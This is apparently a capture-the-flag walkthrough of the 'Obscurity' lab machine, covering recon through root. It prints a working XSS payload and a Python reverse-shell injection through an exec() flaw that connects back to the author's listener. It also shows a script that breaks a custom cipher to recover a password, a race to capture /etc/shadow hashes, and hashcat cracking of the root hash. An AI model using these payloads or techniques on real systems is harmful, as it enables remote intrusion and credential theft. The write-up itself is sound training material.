# obscurity

## general 

**IP**: 10.10.10.168


## recon

### initial

the homepage gives us our first big clue with copy at the bottom:

> Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory

this indicates there's a hidden directory with a file called `SuperSecureServer.py` that we need to find.

meanwhile, i ran an `nmap` scan as well as a `nikto` scan.

##### nmap

```
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (EdDSA)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Mon, 13 Jan 2020 07:04:52
|     Server: BadHTTPServer
|     Last-Modified: Mon, 13 Jan 2020 07:04:52
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
```

##### nikto -> xss

lots of interesting results there, an overwhelming number of which pointed towards the site having lots of XSS vulns - i confirmed this by writing a simple `.js` script and hosting it on a local server from my docker container (literally just a `test.js` file with `alert('sup')` in it)

i used a test link from `nikto` to verify:

```
http://10.10.10.168:8080/administrator/popups/sectionswindow.php?type=web&link=\"<script src="http://[mydockerip]:8000/test.js"></script>
```

sure enough, `sup` flashed on the screen.

##### dirb

we need to locate `SuperSecureServer.py` - half the battle is won since we already know the filename. maybe we'll get lucky running this against one of the common directory wordlists? 

`gobuster` is usually my go to, but it didn't work w/ this box because of the invalid ('obfuscated') server response returned from `obscure.htb` - nevertheless, any dir fuzzing utility ought to do here.

in my case i used [dirb](https://tools.kali.org/web-applications/dirb)

```
dirb http://10.10.10.168:8080/ /path/to/wordlist/file -X /SuperSecureServer.py
```

took me a minute to figure out that the `-X` extensions flag _also_ works for full filenames.

results:

```
/var/SuperSecureServer/SuperSecureServer.py
/var/SuperSecureServer/DocRoot/develop/SuperSecureServer.py
```

## super secure server

next, we take a look at the file and see that that XSS vulnerability is more than just a client-side issue. the notable line is `143`:

```
info = "output = 'Document: {}'" # Keep the output for later debug
exec(info.format(path)) # This is how you do string formatting, right?
cwd = os.path.dirname(os.path.realpath(__file__))
docRoot = os.path.join(cwd, docRoot)
```

we've already confirmed the XSS vulnerability, now it appears we can actually inject code that makes server-side requests as well. since we know the site's running python, why not try to create a reverse shell?

i created a test file in python to 'sanitize' my shell input, but all we're ultimately doing is encoding it: 

```
import os
path = input("# ")
info = "output = 'Document: {}'" # Keep the output for later debug
print(info.format(path))
exec(info.format(path))
```

a basic reverse shell in python:

```
python -c "'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[my ip]",[my exposed port]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"
```

a few tweaks, and the following satisfied the 'validations' in place by the server:

```
index.html';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.78",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash");x='x
```

next, i set up a listener from my container running openvpn, etc. to wait for an incoming connection after i made the request:

```
nc -lvp 4444
```

then in my proxied browser: `http://10.10.10.168:8080/index.html';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[my ip]",[my exposed port]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash");x='x`

and _voilà_, we're in as `www-data`

---

## owning user

is `www-data` our user? running `find / name user.txt 2>/dev/null` indicates otherwise, the only user in the $HOME directory is **robert** (`/home/robert/user.txt`) and he's got what we want.

nevertheless, what can we do as `var/wwww`? enumerating through the fs, i checked what world readable files there were in /home/ and found some promising leads:

```
-rw-r--r-- 1 robert robert 220 Apr  4  2018 /home/robert/.bash_logout
-rw-r--r-- 1 robert robert 3771 Apr  4  2018 /home/robert/.bashrc
-rw-rw-r-- 1 robert robert 27 Oct  4 15:01 /home/robert/passwordreminder.txt
-rw-rw-r-- 1 robert robert 94 Sep 26 23:08 /home/robert/check.txt
-rwxr-xr-x 1 root root 1805 Oct  5 13:09 /home/robert/BetterSSH/BetterSSH.py
-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 /home/robert/SuperSecureCrypt.py
-rw-rw-r-- 1 robert robert 185 Oct  4 15:01 /home/robert/out.txt
-rw-r--r-- 1 robert robert 807 Apr  4  2018 /home/robert/.profile
```

i was also able to fetch the password policy:

```
CRYPT_METHOD" /etc/login.defs 2>/dev/nullSS_WARN_AGE\|^ENC
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   7
ENCRYPT_METHOD SHA512
```

the clear first file to take a closer look at in `/home/robert/` is `passwordreminder.txt`, which reveals there is an encrypted password (``´ÑÈÌÉàÙÁÑé¯·¿k`)

more about that file:

```
File: passwordreminder.txt
  Size: 27              Blocks: 8          IO Block: 4096   regular file
Device: 802h/2050d      Inode: 402325      Links: 1
Access: (0664/-rw-rw-r--)  Uid: ( 1000/  robert)   Gid: ( 1000/  robert)
Access: 2020-01-20 01:09:36.378747707 +0000
Modify: 2019-10-04 15:01:51.355905372 +0000
Change: 2019-10-04 15:01:51.355905372 +0000
 Birth: -
```

reading through `SuperSecureCrypt.py` reveals the encryption mechanism in `encrypt` and `decrypt` - namely that the cipher is determined via some unicode manipulation:

let's first look at `encrypt` to see what's happening:

```
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted
```

the most important operations here are using the `ord()` and `chr()` functions - so what do those do?

`ord()`
> Given a string of length one, return an integer representing the Unicode code point of the character when the argument is a unicode object, or the value of the byte when the argument is an 8-bit string. For example, ord(‘a’) returns the integer 97, ord(‘€’) (Euro sign) returns 8364. This is the inverse of chr() for 8-bit strings and of unichr() for unicode objects. If a unicode argument is given and Python was built with UCS2 Unicode, then the character’s code point must be in the range [0..65535] inclusive.

`chr()`
> The chr() method returns a character (a string) from an integer (represents unicode code point of the character). The chr() method takes a single parameter, an integer i. The valid range of the integer is from 0 through 1,114,111.


in explain it to me like i'm five terms, all this code is doing is flipping around single character values using other, existing representations of those values. the encryption maintains order and length as well. 

another important note: the contents of `check.txt`, which reads:

> Encrypting this file with your key should result in out.txt, make sure your key is correct!

`out.txt`:

> ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v

nice - so we've basically got a validation check in place for testing. we could go about this in two ways: 

1) brute forcing the password against that validation 
2) writing a decryption function that just reverses this unicde manipulation by using the `check.txt` and `out.txt` values as representations of a password and key, respectively.

let's go with #2:

```
## break.py

import sys
import re

def find_repeat(string):
  match= re.match(r'(.*?)(?:\1)*$', string)
  word= match.group(1)
  return word

def breaker(password, key):
  index = 0
  decrypted = ""
  for char in password:
    decrypted += chr((ord(key[index]) - ord(char)) % 255)
    index += 1

  print(find_repeat(decrypted))

with open("check.txt", "r") as c:
  with open("out.txt", "r") as o:
    breaker(c.read(), o.read())

```

running this returns `alexandrovich` as the key! 

now, we can use this key to decrypt robert's password in `passwordreminder.txt` by running the `SuperSecureCrypt.py` script (where `-d` is the decrypt flag):

```
python3 SuperSecureCrypt.py -i passwordreminder.txt -o password.txt -k alexandrovich -d
```

nice! we got the password :) 

now, let's log in as robert

### robert

repeat the steps to access the server as `www-data` - then switch users w/ our new password via `su - robert`

from there we can easily fetch our `user.txt` file. 

what else can robert do, though?

running `sudo -l` reveals whether robert has any sudo privileges, and...turns out he does:

```
(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

what's happening in this script?
- when run w/ `sudo` privs, encrypted passwords are read from the `/etc/shadow` file line by line
- the line is then split using `:` as the delimiter when `$` is found
    - remember the info we found earlier about the password encryption policy being `SHA512`? cross-referencing this info w/ hash examples (like [here](https://hashcat.net/wiki/doku.php?id=example_hashes) for example) we see when searching `sha512` hash types the `ha512crypt $6$, SHA512 (Unix) 2` type always begins with a `$6` - so we know now that that delimeter is separating passwords. this is also important to remember later when it comes to actually _cracking_ the encrypted root password.
- the owner and encrypted password array is then stored in a larger array (`passwords`) which is written to a temporary file with a randomly generated name, aptly located in `/tmp/SSH/`
- the program then iterates through our `passwords` 2D array, checks if the value at index `0` (current user name) matches that of the current session user
    - if it doesn't match, no salt value is set and the program exits on an authentication error
- if it matches, the password value (at index `1`) is split by the `$` delimeter - the hashes in this type begin with a `$6$` and are then followed by text which reaches a third `$` that separates it from the rest of the text, where the text after `$6$` is the hash and the text after the third `$` is the 'real password' (`realPass`) in the program.
- the user input password is then encrypted with the salt to check for a match
- next a child program is opened in a new subprocess process that runs `sudo -u session['user']` - let's quickly look at what `sudo -u [user]` does:

`-u user, --user=user`:

>Run the command as a user other than the default target user (usually root ). The user may be either a user name or a numeric user ID (UID) prefixed with the ‘#’ character (e.g. #0 for UID 0). When running commands as a UID, many shells require that the ‘#’ be escaped with a backslash (‘\’). Some security policies may restrict UIDs to those listed in the password database. The sudoers policy allows UIDs that are not in the password database as long as the targetpw option is not set. Other security policies may not support this.

- this subprocess command then essentially prepends `sudo -u` to all subsequent user commands (though it might benefit from using `.decode('unicode_escape')` over `.decode('ascii'))`) - though if you already don't have `sudo` privileges, this won't change that - meaning, technically, a non-sudo user with a password saved to `/etc/shadow` could still capture the output of all of these encrypted passwords given the results are written to `/tmp/SSH` if a match is found no matter what. woof.

so what now? capture that `/tmp/SSH` file!

#### capturing the tmp file

generally, this part would would be pretty simple - we would just copy the `tmp` file and start trying to crack the root password, but upon success or failure, that `tmp` file is immediately deleted before the program exits. 

so, we need to listen in on what's written to that directory while we run the program. this can be accomplished through another python script (`snoop.py`) where we run a `while` loop and, by using the [shutil](https://docs.python.org/3/library/shutil.html) package's `copyfile` method, capture the contents of all files in that directory until the program exits:

`shutil.copyfile(src, dst, *, follow_symlinks=True)`
> Copy the contents (no metadata) of the file named src to a file named dst and return dst in the most efficient way possible. src and dst are path-like objects or path names given as strings.

you can use `wget` or `scp` to copy in the `snoop.py` script to `/home/robert`, then:

```
python3 snoop.py &
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
Enter password: ******
Authed!
```

examine the contents of `/home/robert/` and copy/save the contents of the generated `tmp` file. the value within that we care about is of course beneath `root`, the hash beginning with `$6$`

---

## owning root

save the encrypted `root` password to its own dedicated file with the syntax `root:$6$[rest of pw]` - for our purposes, assume i called it `root_encrypted.txt`

we already know the hashtype, so let's run it through `hashcat` to see if it can be broken against one of the existing wordlists.

`hashcat -a 0 -m 1800 -D 2 --username -o root_password.txt root_encrypted.txt /path/to/passwords/list` (i had to run this on my host OS because docker wasn't a fan, but there's likely a way around that)

let's explain these flags:

`-a 0` -> **attack_mode** 
- also known as a 'dictionary' attack
- trying all words in a list; also called “straight” mode (attack mode 0, -a 0)

`-m 1800` -> **hash type**
- refer to the hash type notes above - cross referencing against the `hashcat` [codes](https://hashcat.net/wiki/doku.php?id=example_hashes) we see `1800` matches our type of `sha512crypt $6$, SHA512 (Unix) 2`

`-D 2` -> **opencl-device-types**
- 2 = GPU

`--username` -> "Enable ignoring of usernames in hashfile"

`-o` --> output file

after running that, we've cracked root! login and fetch the `root.txt` file
